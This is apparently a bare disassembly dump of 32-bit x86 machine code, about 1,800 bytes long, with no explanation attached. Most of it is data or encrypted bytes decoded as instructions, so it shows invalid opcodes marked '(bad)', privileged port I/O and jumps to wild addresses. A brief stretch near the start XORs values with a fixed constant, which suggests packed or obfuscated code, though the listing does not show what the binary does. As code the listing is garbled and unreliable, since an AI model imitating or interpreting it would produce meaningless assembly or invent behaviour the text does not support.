  41a871:	arpl   WORD PTR [ebx],sp
  41a873:	or     al,0xc0
  41a875:	div    BYTE PTR [edi+0x5e]
  41a878:	sti    
  41a879:	(bad)  
  41a87a:	in     eax,dx
  41a87b:	(bad)  
  41a87c:	rcl    DWORD PTR [esi-0x37],cl
  41a87f:	sub    BYTE PTR [edx+0x5e],0x9a
  41a883:	mov    esi,0x29dda2b7
  41a888:	push   ecx
  41a889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a88a:	pop    esi
  41a88b:	loope  0x41a8d7
  41a88d:	ja     0x41a817
  41a88f:	pop    edi
  41a890:	or     ch,BYTE PTR [edx-0x37d36292]
  41a896:	daa    
  41a897:	push   ss
  41a898:	in     al,0x19
  41a89a:	mov    eax,0x6ef8ef55
  41a89f:	iret   
  41a8a0:	das    
  41a8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8a2:	not    ebx
  41a8a4:	(bad)  
  41a8a5:	out    0x97,al
  41a8a7:	outs   dx,BYTE PTR ss:[esi]
  41a8a9:	rcl    BYTE PTR [esi+0x27146a19],0x9f
  41a8b0:	cmp    BYTE PTR [ebx+0x44e9c303],ch
  41a8b6:	and    BYTE PTR [eax],al
  41a8b8:	add    BYTE PTR [ebx-0x48f02bbb],cl
  41a8be:	add    al,0x78
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	and    eax,0x44
  41a917:	shl    ch,1
  41a919:	dec    eax
  41a91a:	aad    0x7f
  41a91c:	js     0x41a92e
  41a91e:	jle    0x41a998
  41a920:	js     0x41a8e7
  41a922:	inc    eax
  41a923:	mov    dl,0xca
  41a925:	pop    eax
  41a926:	fwait
  41a927:	iret   
  41a928:	ror    DWORD PTR [esi+0x3],1
  41a92b:	out    dx,al
  41a92c:	stos   DWORD PTR es:[edi],eax
  41a92d:	repnz shr BYTE PTR [ebx+0x5a],cl
  41a931:	outs   dx,BYTE PTR ds:[esi]
  41a932:	fdivr  QWORD PTR [ecx-0x65]
  41a935:	sar    cl,1
  41a937:	add    BYTE PTR [edx+0x300064ac],0x83
  41a93e:	pop    edx
  41a93f:	jb     0x41a8ef
  41a941:	or     BYTE PTR [esi],bl
  41a943:	not    BYTE PTR [ebp-0x3]
  41a946:	imul   esp,DWORD PTR [ebp+ecx*2+0x447dcec4],0xf19826bd
  41a951:	fwait
  41a952:	test   DWORD PTR ds:0xec9fed7c,eax
  41a958:	fwait
  41a959:	pop    edi
  41a95a:	sbb    dl,BYTE PTR [eax+0x1251e5a5]
  41a960:	(bad)  
  41a961:	xchg   esp,eax
  41a962:	sbb    al,0x7b
  41a964:	jecxz  0x41a947
  41a966:	(bad)  
  41a967:	into   
  41a968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a969:	popa   
  41a96a:	std    
  41a96b:	xlat   BYTE PTR ds:[ebx]
  41a96c:	les    esi,FWORD PTR [edi]
  41a96e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a96f:	pop    ds
  41a970:	ret    
  41a971:	push   ds
  41a972:	adc    eax,0xd6451408
  41a977:	xchg   DWORD PTR [eax],esi
  41a979:	add    ah,bh
  41a97b:	dec    eax
  41a97c:	mov    dh,0x25
  41a97e:	jle    0x41a97c
  41a980:	jp     0x41a96d
  41a982:	dec    ebp
  41a983:	outs   dx,BYTE PTR ds:[esi]
  41a984:	mov    BYTE PTR [esi+0x68bef168],dh
  41a98a:	mov    dh,0x73
  41a98c:	fnsave [esi-0x31]
  41a98f:	xchg   bl,bl
  41a991:	mov    eax,ds:0x4895761c
  41a996:	mov    ch,0x56
  41a998:	ret    0xf79c
  41a99b:	in     eax,0x80
  41a99d:	or     ecx,DWORD PTR [ebx+0x40]
  41a9a0:	sbb    al,ch
  41a9a2:	inc    esi
  41a9a3:	mov    ds:0xd6c1060,eax
  41a9a8:	daa    
  41a9a9:	add    ebx,edx
  41a9ab:	xchg   ebx,eax
  41a9ac:	cmp    al,0xe6
  41a9ae:	cmp    DWORD PTR [esi-0x42],0xbe921050
  41a9b5:	scas   al,BYTE PTR es:[edi]
  41a9b6:	adc    al,0xf3
  41a9b8:	dec    ebp
  41a9b9:	lea    ebp,[ebx]
  41a9bb:	sahf   
  41a9bc:	mov    ebx,DWORD PTR [ebp-0x11c7b38e]
  41a9c2:	sbb    DWORD PTR [ecx+0x690d06c5],eax
  41a9c8:	mov    esp,0x3f3597cb
  41a9cd:	add    BYTE PTR [ebp+0xd90d1e9],ch
  41a9d3:	(bad)  
  41a9d5:	inc    ebx
  41a9d6:	dec    ebp
  41a9d7:	cli    
  41a9d8:	pop    esp
  41a9d9:	mov    eax,ds:0x70f9f2c5
  41a9de:	add    BYTE PTR ds:0x6581341,ah
  41a9e5:	outs   dx,BYTE PTR ds:[esi]
  41a9e6:	sti    
  41a9e7:	pop    ecx
  41a9e8:	add    edi,DWORD PTR [ebp-0x23]
  41a9eb:	into   
  41a9ec:	stos   DWORD PTR es:[edi],eax
  41a9ed:	jnp    0x41a9b5
  41a9ef:	dec    esi
  41a9f0:	pusha  
  41a9f1:	sbb    al,0x35
  41a9f3:	xchg   ecx,ecx
  41a9f5:	stc    
  41a9f6:	mov    bl,0xad
  41a9f8:	xchg   esi,eax
  41a9f9:	dec    edi
  41a9fa:	pop    eax
  41a9fb:	pop    edi
  41a9fc:	(bad)
  41aa00:	pop    ds
  41aa01:	jns    0x41a9f6
  41aa03:	pop    ecx
  41aa04:	retf   0x2097
  41aa07:	ins    DWORD PTR es:[edi],dx
  41aa08:	sti    
  41aa09:	bound  edi,QWORD PTR [eax-0x38325cdc]
  41aa0f:	loopne 0x41a9ba
  41aa11:	mov    WORD PTR cs:[eax+eax*2-0x70],fs
  41aa16:	ret    
  41aa17:	xor    eax,0x136b4f62
  41aa1c:	aad    0x5e
  41aa1e:	sub    DWORD PTR [ebx-0x33d4c25f],eax
  41aa24:	fcomp  DWORD PTR [esi+0x5e]
  41aa27:	(bad)  
  41aa28:	stos   DWORD PTR es:[edi],eax
  41aa29:	push   esi
  41aa2a:	and    cl,BYTE PTR [ecx+eiz*1]
  41aa2d:	and    eax,0x7b770151
  41aa32:	ja     0x41aa0a
  41aa34:	(bad)  [esp+edi*8-0x29]
  41aa38:	in     al,dx
  41aa39:	pop    ss
  41aa3a:	scas   al,BYTE PTR es:[edi]
  41aa3b:	int3   
  41aa3c:	add    edi,eax
  41aa3e:	mov    ch,0xd4
  41aa40:	cmp    al,0x52
  41aa42:	add    DWORD PTR [eax],ebp
  41aa44:	adc    edx,DWORD PTR [ebx]
  41aa46:	push   esi
  41aa47:	fdiv   DWORD PTR [ecx-0x38]
  41aa4a:	cmp    DWORD PTR [edi],esi
  41aa4c:	pop    esi
  41aa4d:	mov    ah,0xe1
  41aa4f:	sahf   
  41aa50:	sbb    bl,BYTE PTR [edi+eiz*2-0x63877257]
  41aa57:	repnz cwde 
  41aa59:	push   ecx
  41aa5a:	lds    esp,FWORD PTR [eax-0x4d]
  41aa5d:	mov    eax,ds:0xa4579a9e
  41aa62:	(bad)  
  41aa63:	into   
  41aa64:	push   ecx
  41aa65:	xor    BYTE PTR [edx-0x36163362],dh
  41aa6b:	hlt    
  41aa6c:	leave  
  41aa6d:	jb     0x41aa2e
  41aa6f:	out    dx,al
  41aa70:	cli    
  41aa71:	mov    esi,0x757c6117
  41aa76:	outs   dx,DWORD PTR ds:[esi]
  41aa77:	sub    BYTE PTR [ebx+0x2a],dl
  41aa7a:	jb     0x41aaa9
  41aa7c:	test   DWORD PTR [edx+0xeb27f5d],ecx
  41aa82:	sbb    eax,0xe7dda94
  41aa87:	mov    ebx,0x2f344a23
  41aa8c:	xlat   BYTE PTR ds:[ebx]
  41aa8d:	add    edx,DWORD PTR ds:0xd7db1ec9
  41aa93:	rol    BYTE PTR [ebx],cl
  41aa95:	mov    DWORD PTR [eax],ebp
  41aa97:	or     edx,DWORD PTR [ecx]
  41aa99:	inc    esi
  41aa9a:	dec    esp
  41aa9b:	stos   BYTE PTR es:[edi],al
  41aa9c:	jge    0x41aa4c
  41aa9e:	stos   DWORD PTR es:[edi],eax
  41aa9f:	out    0xc0,al
  41aaa1:	mov    eax,0x7c338d34
  41aaa6:	xor    DWORD PTR [esi-0x6c6fb58d],esi
  41aaac:	stos   DWORD PTR es:[edi],eax
  41aaad:	aam    0xc6
  41aaaf:	xor    ebp,DWORD PTR [esi]
  41aab1:	xor    BYTE PTR [eax+ebx*8],ch
  41aab4:	inc    ebp
  41aab5:	push   ebp
  41aab6:	outs   dx,DWORD PTR ds:[esi]
  41aab7:	inc    ebx
  41aab8:	loop   0x41aa80
  41aaba:	jae    0x41ab26
  41aabc:	(bad)  
  41aabd:	push   ds
  41aabe:	add    al,0x9e
  41aac0:	aas    
  41aac1:	aaa    
  41aac2:	adc    cl,BYTE PTR [ecx+ebp*4+0x238b0498]
  41aac9:	(bad)  [edi+0x219fdc08]
  41aacf:	jecxz  0x41aaad
  41aad1:	push   ecx
  41aad2:	jge    0x41ab22
  41aad4:	(bad)  
  41aad5:	rcr    DWORD PTR [edx],1
  41aad7:	mov    eax,DWORD PTR [ebx-0x65]
  41aada:	loope  0x41ab04
  41aadc:	mov    edx,0xf0d8a8ed
  41aae1:	inc    edi
  41aae2:	push   ebx
  41aae3:	ret    0xa06a
  41aae6:	pop    ss
  41aae7:	pop    es
  41aae8:	cmc    
  41aae9:	rol    DWORD PTR [esi-0x4d29264e],0xac
  41aaf0:	in     al,dx
  41aaf1:	inc    edx
  41aaf2:	mov    eax,0xc7bd0ae9
  41aaf7:	sbb    al,0x86
  41aaf9:	aad    0xd0
  41aafb:	fnclex 
  41aafd:	ret    
  41aafe:	loop   0x41ab45
  41ab00:	cmp    BYTE PTR [esi-0x34e020f9],0x93
  41ab07:	xor    ebx,eax
  41ab09:	out    0xb1,eax
  41ab0b:	inc    esp
  41ab0c:	sti    
  41ab0d:	mov    ch,0x2b
  41ab0f:	shl    DWORD PTR [ebx-0x364cde7],0x43
  41ab16:	outs   dx,BYTE PTR ds:[esi]
  41ab17:	sahf   
  41ab18:	fcom   st(4)
  41ab1a:	sbb    DWORD PTR [ebx+0x14],esp
  41ab1d:	xor    eax,DWORD PTR [ebx+0x7813fc3a]
  41ab23:	mov    eax,ds:0xd3beb0a2
  41ab28:	pcmpeqw mm2,QWORD PTR [edi+ecx*4+0x59]
  41ab2d:	test   al,0x20
  41ab2f:	lods   eax,DWORD PTR ds:[esi]
  41ab30:	dec    ebp
  41ab31:	mov    esp,0x48f63392
  41ab36:	jnp    0x41ab1e
  41ab38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab39:	pop    ecx
  41ab3a:	push   0x5
  41ab3c:	dec    ecx
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0x4b07bbbe
  41ab52:	pop    ds
  41ab53:	pusha  
  41ab54:	fstp   TBYTE PTR [edi+0x78]
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41ab63
  41ab5c:	jle    0x41ab6e
  41ab5e:	push   esi
  41ab5f:	lea    ebp,[edx]
  41ab61:	pop    edx
  41ab62:	out    0xfb,al
  41ab64:	push   eax
  41ab65:	je     0x41aba2
  41ab67:	int3   
  41ab68:	shl    BYTE PTR [ebp+0x807292f],0x9e
  41ab6f:	sbb    eax,edx
  41ab71:	mov    es,WORD PTR [edi]
  41ab73:	adc    eax,0x3d7a61d0
  41ab78:	bnd jg 0x41ab68
  41ab7b:	sub    dh,BYTE PTR [esi]
  41ab7d:	cdq    
  41ab7e:	push   ecx
  41ab7f:	les    eax,FWORD PTR [ebx-0x37e9d9d9]
  41ab85:	rol    DWORD PTR ds:0xfd3ebc20,1
  41ab8b:	loop   0x41abbd
  41ab8d:	int    0x95
  41ab8f:	xchg   edx,eax
  41ab90:	cli    
  41ab91:	and    bl,BYTE PTR [ebp+esi*1+0x23]
  41ab95:	icebp  
  41ab96:	adc    cl,BYTE PTR [ebx-0x59]
  41ab99:	adc    eax,0x21a1319b
  41ab9e:	pop    edi
  41ab9f:	add    eax,0xa896f48f
  41aba4:	dec    edx
  41aba5:	cmp    eax,0x8493fc99
  41abaa:	jb     0x41abab
  41abac:	inc    esp
  41abad:	and    dh,BYTE PTR [ecx+0x343ec722]
  41abb3:	out    0x6e,eax
  41abb5:	xchg   esi,eax
  41abb6:	bound  ebp,QWORD PTR [esi]
  41abb8:	adc    BYTE PTR [eax+ebp*4],0xe5
  41abbc:	jae    0x41abbe
  41abbe:	and    esp,DWORD PTR [ecx+0x36]
  41abc1:	mov    dh,0xc4
  41abc3:	call   0xf579c026
  41abc8:	inc    ebx
  41abc9:	xchg   ch,dl
  41abcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abcc:	ins    BYTE PTR es:[edi],dx
  41abcd:	ins    DWORD PTR es:[edi],dx
  41abce:	retw   0x2813
  41abd2:	inc    ebp
  41abd3:	mov    ecx,0x62cf5b22
  41abd8:	jb     0x41ac43
  41abda:	cld    
  41abdb:	dec    esi
  41abdc:	data16 shl BYTE PTR [ecx-0x76cc804c],0xeb
  41abe4:	pop    ebx
  41abe5:	pop    ds
  41abe6:	icebp  
  41abe7:	xchg   DWORD PTR [eax+0x49255326],edi
  41abed:	and    BYTE PTR [eax],ch
  41abef:	test   al,0xdd
  41abf1:	sbb    eax,0x2ef5907f
  41abf6:	outs   dx,DWORD PTR ds:[esi]
  41abf7:	xchg   edx,eax
  41abf8:	push   ebp
  41abf9:	sahf   
  41abfa:	int3   
  41abfb:	lahf   
  41abfc:	inc    esp
  41abfd:	xor    eax,eax
  41abff:	mov    cl,0x83
  41ac01:	popf   
  41ac02:	jmp    0x41ac79
  41ac04:	neg    DWORD PTR [edx]
  41ac06:	sti    
  41ac07:	push   edx
  41ac08:	in     eax,0xd2
  41ac0a:	loope  0x41abe4
  41ac0c:	test   DWORD PTR ds:0x7dc15e8a,0x35b71fbb
  41ac16:	and    BYTE PTR [eax-0x72],0x8b
  41ac1a:	adc    DWORD PTR [edi],ecx
  41ac1c:	mov    WORD PTR [ebx+0x4b37ddb8],es
  41ac22:	mov    eax,ds:0xc9e6b980
  41ac27:	pop    ebx
  41ac28:	pop    ss
  41ac29:	or     DWORD PTR [esi],ebp
  41ac2b:	add    al,cl
  41ac2d:	adc    ebx,DWORD PTR [ebx+0x43d46ac0]
  41ac33:	mov    BYTE PTR [eax],dh
  41ac35:	jp     0x41ac03
  41ac37:	mov    dl,0xd2
  41ac39:	retf   
  41ac3a:	sub    DWORD PTR [ebp+0x33],edi
  41ac3d:	dec    edx
  41ac3e:	sbb    BYTE PTR [ebp-0x623b051e],ah
  41ac44:	call   0x96087c67
  41ac49:	sbb    DWORD PTR [edi+0x3a6e1320],edx
  41ac4f:	xchg   BYTE PTR [esi+0x17e87e2c],ah
  41ac55:	into   
  41ac56:	add    DWORD PTR [esi-0x76],edi
  41ac59:	push   edx
  41ac5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac5b:	stos   BYTE PTR es:[edi],al
  41ac5c:	ss push esi
  41ac5e:	adc    al,0xd6
  41ac60:	jbe    0x41acc0
  41ac62:	fs and al,0x81
  41ac65:	jge    0x41accb
  41ac67:	stos   DWORD PTR es:[edi],eax
  41ac68:	pop    es
  41ac69:	retf   
  41ac6a:	js     0x41ac15
  41ac6c:	test   eax,0xcacac453
  41ac71:	mov    eax,esi
  41ac73:	jmp    0x41acc0
  41ac75:	rcr    DWORD PTR [edi-0x7e5064ee],cl
  41ac7b:	out    dx,al
  41ac7c:	js     0x41acf9
  41ac7e:	fwait
  41ac7f:	sub    DWORD PTR [edi-0x3a],eax
  41ac82:	dec    ebx
  41ac83:	daa    
  41ac84:	rcl    BYTE PTR [ebx],0x93
  41ac87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac88:	or     BYTE PTR [edi],ah
  41ac8a:	nop
  41ac8b:	ins    DWORD PTR es:[edi],dx
  41ac8c:	icebp  
  41ac8d:	enter  0x6d65,0xfc
  41ac91:	push   esi
  41ac92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac93:	add    ebp,ecx
  41ac95:	scas   al,BYTE PTR es:[edi]
  41ac96:	mov    ecx,0xb6ba28c7
  41ac9b:	mov    WORD PTR [ebp+0x7],ss
  41ac9e:	sub    ecx,DWORD PTR [edi-0x29]
  41aca1:	xor    BYTE PTR [edx],0x1a
  41aca4:	ret    0x56d4
  41aca7:	cwde   
  41aca8:	mov    ecx,DWORD PTR [ebx+0x55]
  41acab:	pop    ds
  41acac:	icebp  
  41acad:	and    DWORD PTR [edx],esp
  41acaf:	sub    edx,DWORD PTR [ebx+ecx*8+0x2d]
  41acb3:	sbb    esi,DWORD PTR [esi-0x3157c363]
  41acb9:	out    dx,al
  41acba:	push   ds
  41acbb:	into   
  41acbc:	in     al,0x51
  41acbe:	lahf   
  41acbf:	ss ret 0xf8ed
  41acc3:	xlat   BYTE PTR ds:[ebx]
  41acc4:	cwde   
  41acc5:	loope  0x41acd6
  41acc7:	fsubr  QWORD PTR [ecx-0x29471caa]
  41accd:	cli    
  41acce:	sti    
  41accf:	loop   0x41ad48
  41acd1:	xlat   BYTE PTR ss:[ebx]
  41acd3:	arpl   sp,cx
  41acd5:	jb     0x41ad0a
  41acd7:	cld    
  41acd8:	shl    ebp,1
  41acda:	xchg   esp,eax
  41acdb:	mov    ecx,0xfc28ce1c
  41ace0:	in     al,0xf7
  41ace2:	cwde   
  41ace3:	clc    
  41ace4:	leave  
  41ace5:	mov    esi,DWORD PTR [ecx-0xd]
  41ace8:	mov    esi,0xf22877c7
  41aced:	repnz mov eax,0x4b37c7ce
  41acf3:	cs push 0x5c
  41acf6:	fucom  st(5)
  41acf8:	test   BYTE PTR [eax-0x63],ah
  41acfb:	call   0x97bf5389
  41ad00:	push   0xc
  41ad02:	outs   dx,BYTE PTR ds:[esi]
  41ad03:	sbb    al,0xbd
  41ad05:	inc    ecx
  41ad06:	jmp    0x5837a0fe
  41ad0b:	and    ah,BYTE PTR [eax+0x1b]
  41ad0e:	sub    ch,BYTE PTR [edi-0x52e0f01f]
  41ad14:	inc    ebp
  41ad15:	retf   
  41ad16:	mov    ds:0xb8fc58f3,eax
  41ad1b:	je     0x41acd0
  41ad1d:	pusha  
  41ad1e:	sub    cl,BYTE PTR [edi-0x4a3d1d46]
  41ad24:	cdq    
  41ad25:	iret   
  41ad26:	mov    cl,0x2
  41ad28:	xchg   edx,eax
  41ad29:	sbb    ch,BYTE PTR [edx-0x5c]
  41ad2c:	mov    al,0xac
  41ad2e:	xor    cl,BYTE PTR [ebp-0x82f534]
  41ad34:	jae    0x41ad31
  41ad36:	mov    cl,0xb1
  41ad38:	add    bh,BYTE PTR [edx]
  41ad3a:	pushf  
  41ad3b:	aad    0x10
  41ad3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad3e:	push   0xffffffd0
  41ad40:	into   
  41ad41:	pusha  
  41ad42:	mov    ebx,0x64114013
  41ad47:	sti    
  41ad48:	ja     0x41ad4e
  41ad4a:	mov    BYTE PTR [eax],ch
  41ad4c:	jmp    0x41acf6
  41ad4e:	adc    al,0x58
  41ad50:	mov    ch,0x5
  41ad52:	sar    DWORD PTR [ebp+0x6b],1
  41ad55:	or     eax,0xb6873a01
  41ad5a:	jmp    0xd62736b2
  41ad5f:	sbb    eax,0x3510d58e
  41ad64:	sbb    BYTE PTR [edi-0x3b],dh
  41ad67:	cmc    
  41ad68:	clc    
  41ad69:	call   0x918e2f19
  41ad6e:	sahf   
  41ad6f:	xor    ebx,ebp
  41ad71:	add    esi,ebp
  41ad73:	xchg   ebx,ecx
  41ad75:	sub    ebx,ecx
  41ad77:	jmp    0x41afac
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0x75d25295,eax
  41ad89:	ins    BYTE PTR es:[edi],dx
  41ad8a:	push   ds
  41ad8b:	(bad)  
  41ad8c:	js     0x41ad66
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41adcc
  41ad95:	mov    edi,0x6320fc91
  41ad9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad9b:	nop
  41ad9c:	or     bh,BYTE PTR [eax+0x6b]
  41ad9f:	stc    
  41ada0:	xor    ebp,0xfffffff3
  41ada3:	gs jns 0x41ad94
  41ada6:	jns    0x41ae23
  41ada8:	dec    eax
  41ada9:	pop    ecx
  41adaa:	loope  0x41ad6c
  41adac:	and    eax,0x3dc23da2
  41adb1:	lods   al,BYTE PTR ds:[esi]
  41adb2:	fnsave [eax]
  41adb4:	add    BYTE PTR [ebx-0x49],cl
  41adb7:	fisub  DWORD PTR [esi+0x4182b6be]
  41adbd:	push   edi
  41adbe:	arpl   bx,bx
  41adc0:	ret    0xc6dd
  41adc3:	jmp    0x4c58f42c
  41adc8:	mov    bh,0x96
  41adca:	fmul   QWORD PTR [ecx-0x5686027d]
  41add0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41add1:	mov    eax,0x931cbc7d
  41add6:	or     DWORD PTR [ebp-0x130cfc43],eax
  41addc:	mov    al,BYTE PTR [ebp+0xe]
  41addf:	and    eax,0x80469bfd
  41ade4:	sti    
  41ade5:	ss mov ah,0x3c
  41ade8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ade9:	or     BYTE PTR [edx+0x2d],bh
  41adec:	cmp    edx,0x296e9006
  41adf2:	mov    bh,0x1d
  41adf4:	inc    esi
  41adf5:	and    ah,BYTE PTR [eax-0x58]
  41adf8:	mov    ecx,0xe18f2f63
  41adfd:	repnz imul ecx,DWORD PTR [eax+0x59],0x6a
  41ae02:	test   eax,0xbdb36cf9
  41ae07:	or     eax,0xb4c4481a
  41ae0c:	push   es
  41ae0d:	or     DWORD PTR [esi],ecx
  41ae0f:	sub    cl,bh
  41ae11:	cmp    al,0xe4
  41ae13:	mov    bh,0x7a
  41ae15:	xchg   ecx,eax
  41ae16:	out    dx,al
  41ae17:	mov    ch,BYTE PTR [ecx+eiz*1-0x4fb88eeb]
  41ae1e:	sub    al,0xe8
  41ae20:	mov    bl,0x18
  41ae22:	data16 or BYTE PTR [edi+0x6074f1e1],0x4f
  41ae2a:	fmul   DWORD PTR ss:[esi]
  41ae2d:	inc    ecx
  41ae2e:	ins    DWORD PTR es:[edi],dx
  41ae2f:	mov    bl,0x12
  41ae31:	inc    ebp
  41ae32:	pushf  
  41ae33:	mov    BYTE PTR [edx-0x2dd0d30a],dh
  41ae39:	mov    eax,0x671526d1
  41ae3e:	sub    DWORD PTR [esi+edx*8+0x45],edx
  41ae42:	xchg   ebx,eax
  41ae43:	iret   
  41ae44:	ds ins BYTE PTR es:[edi],dx
  41ae46:	xor    bh,BYTE PTR [edx+0x44523ad]
  41ae4c:	dec    edi
  41ae4d:	das    
  41ae4e:	data16 shl BYTE PTR [ebp+0x67],0x26
  41ae53:	mov    cl,ah
  41ae55:	push   ss
  41ae56:	daa    
  41ae57:	or     cl,cl
  41ae59:	aad    0x36
  41ae5b:	and    BYTE PTR [esi],dl
  41ae5d:	into   
  41ae5e:	jnp    0x41ae59
  41ae60:	cdq    
  41ae61:	lahf   
  41ae62:	in     al,0x14
  41ae64:	pop    edx
  41ae65:	cmp    DWORD PTR [edx+ecx*1-0x18fde7f3],ecx
  41ae6c:	loope  0x41ae5b
  41ae6e:	cmp    ebx,eax
  41ae70:	inc    edi
  41ae71:	push   cs
  41ae72:	sub    eax,ecx
  41ae74:	adc    DWORD PTR [ecx-0x40b343d2],edx
  41ae7a:	lock call 0xf11a9067
  41ae80:	cmp    esi,DWORD PTR [ecx-0x61dcaa62]
  41ae86:	and    DWORD PTR [edi],esi
  41ae88:	sahf   
  41ae89:	sbb    al,0xb2
  41ae8b:	xor    al,BYTE PTR [edi-0x73]
  41ae8e:	push   0x37d5947a
  41ae93:	inc    esi
  41ae94:	jne    0x41ae67
  41ae96:	lods   al,BYTE PTR ds:[esi]
  41ae97:	shl    DWORD PTR [ebp-0x64b3c12],1
  41ae9d:	in     al,0xfc
  41ae9f:	(bad)  
  41aea0:	jge    0x41ae9d
  41aea2:	sbb    al,0xe8
  41aea4:	in     al,0xe1
  41aea6:	adc    al,0x7e
  41aea8:	test   eax,0x9acb0328
  41aead:	pop    esi
  41aeae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aeaf:	add    esp,DWORD PTR [eax+0x1caab1fb]
  41aeb5:	inc    edx
  41aeb6:	push   ebp
  41aeb7:	add    bl,ah
  41aeb9:	dec    ebx
  41aeba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aebb:	repnz add eax,DWORD PTR [esi-0x55]
  41aebf:	sbb    ebx,ecx
  41aec1:	inc    ebp
  41aec2:	sub    bl,dl
  41aec4:	cmp    ah,al
  41aec6:	and    DWORD PTR [edi-0x46],esi
  41aec9:	les    ecx,FWORD PTR [ebx]
  41aecb:	sbb    DWORD PTR [ecx+0x6d66eb18],esp
  41aed1:	(bad)  
  41aed2:	and    al,0x2c
  41aed4:	pop    ss
  41aed5:	xchg   cl,bh
  41aed7:	push   ds
  41aed8:	test   al,0xa0
  41aeda:	mov    ?,ebp
  41aedc:	or     edi,edx
  41aede:	mov    eax,ds:0x8c5085ae
  41aee3:	sti    
  41aee4:	ins    BYTE PTR es:[edi],dx
  41aee5:	inc    ebx
  41aee6:	mov    dl,0x86
  41aee8:	mov    BYTE PTR [ebp-0x58],bh
  41aeeb:	ins    BYTE PTR es:[edi],dx
  41aeec:	pop    esp
  41aeed:	adc    DWORD PTR [ebp+0x7c],esi
  41aef0:	sub    cl,dl
  41aef2:	mov    cl,0xb1
  41aef4:	(bad)  [ebx+0x3ad0fddc]
  41aefa:	lock xor al,0xa7
  41aefd:	sbb    eax,0xa8d65083
  41af02:	hlt    
  41af03:	sahf   
  41af04:	sub    al,0x2a
  41af06:	sbb    ebp,DWORD PTR [ebx-0x18]
  41af09:	push   es
  41af0a:	push   ds
  41af0b:	pop    ecx
  41af0c:	popa   
  41af0d:	and    ebx,0xa3d28db5
  41af13:	push   edi
  41af14:	hlt    
  41af15:	into   
  41af16:	and    bl,ah
  41af18:	cdq    
  41af19:	push   ebp
  41af1a:	in     al,0xe
  41af1c:	add    dl,ah
  41af1e:	or     dh,BYTE PTR [eax]
  41af20:	leave  
  41af21:	stos   BYTE PTR es:[edi],al
  41af22:	and    DWORD PTR [edx+0x59],ecx
  41af25:	jecxz  0x41af20
  41af27:	mov    al,ds:0x5001718c
  41af2c:	(bad)  
  41af2d:	xchg   edx,eax
  41af2e:	sbb    ecx,DWORD PTR ds:0xb4e11582
  41af35:	jnp    0x41af79
  41af37:	int    0x26
  41af39:	xlat   BYTE PTR ds:[ebx]
  41af3b:	or     bl,ah
  41af3d:	pusha  
  41af3e:	xchg   ebp,eax
  41af3f:	inc    ebp
  41af40:	aas    
  41af41:	push   ecx
  41af42:	sbb    esp,DWORD PTR [eax]
  41af44:	sbb    al,0xda
  41af46:	dec    ecx
  41af47:	sbb    al,0xdc
  41af49:	adc    BYTE PTR [eax+0x0],cl
  41af4c:	fcmovne st,st(0)
  41af4e:	(bad)  
  41af4f:	dec    eax
  41af50:	mov    al,ds:0x6c7219e9
  41af55:	mov    ecx,0xe17d8be0
  41af5a:	adc    BYTE PTR [ebp-0x59],bh
  41af5d:	mov    al,0x77
  41af5f:	scas   al,BYTE PTR es:[edi]
  41af60:	inc    ebx
  41af61:	sbb    dh,BYTE PTR [ebx-0x39e0fdf7]
  41af67:	bound  esp,QWORD PTR [edi]
  41af69:	cmp    DWORD PTR [eax-0x14],0x57f7ff44
  41af70:	mov    dl,0x20
  41af72:	adc    eax,0x5ef7eb65
  41af77:	push   ss
  41af78:	pusha  
  41af79:	jl     0x41afe3
  41af7b:	dec    eax
  41af7c:	mov    BYTE PTR [edx-0x32],dh
  41af7f:	xor    BYTE PTR [edx],cl
  41af81:	add    al,0xe9
  41af83:	lahf   
  41af84:	inc    esp
  41af85:	mov    BYTE PTR [ecx+0xbccd988],0x95
  41af8c:	and    eax,0x5fa60a3d
  41af91:	sub    al,0x94
